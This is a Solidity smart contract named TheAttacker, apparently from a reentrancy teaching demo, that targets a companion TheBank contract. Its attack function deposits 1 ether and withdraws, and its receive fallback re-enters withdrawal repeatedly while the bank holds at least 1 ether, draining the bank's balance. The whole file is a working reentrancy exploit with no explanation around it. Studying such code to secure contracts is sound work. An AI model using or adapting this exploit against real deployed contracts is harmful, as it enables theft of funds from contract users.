// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./TheBank.sol";

contract TheAttacker {
    TheBank public theBank;
    mapping(address => uint) public balances;

    constructor(address _thebankAddress) {
        theBank = TheBank(_thebankAddress);
    }

    receive() external payable {
        if (address(theBank).balance >= 1 ether) {
            theBank.withdrawal();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        theBank.deposit{value: 1 ether}();
        theBank.withdrawal();
    }

    function getBalances() public view returns (uint) {
        return address(this).balance;
    }
}
